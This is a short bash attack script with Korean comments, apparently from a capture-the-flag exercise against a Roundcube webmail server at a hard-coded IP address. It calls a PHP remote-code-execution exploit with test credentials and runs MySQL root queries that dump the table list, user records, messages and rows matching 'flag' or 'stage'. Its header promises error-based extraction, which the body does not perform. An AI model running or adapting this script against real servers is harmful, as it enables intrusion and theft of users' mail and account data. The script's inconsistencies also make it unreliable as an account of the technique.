#!/bin/bash
# MySQL Error-based Data Extraction
# ExtractValue() 함수를 사용해서 쿼리 결과를 에러 메시지에 노출

TARGET="http://13.125.104.131:30083"

echo "=== MySQL Error-based Data Extraction ==="
echo

# MySQL root로 직접 실행 (RCE 권한 있음)
# fearsoff_exploit.php를 통해 다음 명령 실행

COMMANDS=(
  # 1. 모든 테이블 확인
  "mysql -h localhost -u root roundcube -e 'SHOW TABLES;' 2>&1 | head -30"
  
  # 2. preferences 테이블 구조
  "mysql -h localhost -u root roundcube -e 'DESC preferences;' 2>&1"
  
  # 3. preferences에서 stage 관련 데이터 조회
  "mysql -h localhost -u root roundcube -e 'SELECT * FROM preferences WHERE prefs_name LIKE \"%stage%\" OR prefs_name LIKE \"%flag%\";' 2>&1"
  
  # 4. users 테이블 확인
  "mysql -h localhost -u root roundcube -e 'SELECT * FROM users;' 2>&1"
  
  # 5. messages 테이블 확인
  "mysql -h localhost -u root roundcube -e 'SELECT * FROM messages LIMIT 10;' 2>&1"
)

for i in "${!COMMANDS[@]}"; do
  CMD="${COMMANDS[$i]}"
  echo "[*] Command $((i+1)): $CMD"
  echo
  
  # 결과를 /tmp 파일에 저장한 후 base64로 인코딩해서 다시 요청
  # 하지만 stdout을 회수할 수 없으니, 파일 타이밍으로 크기 판정
  
  php loot/fearsoff_exploit.php "$TARGET" "testuser" "testpass" "$CMD" 2>&1 | \
    head -200
  
  echo
  echo "---"
  echo
done
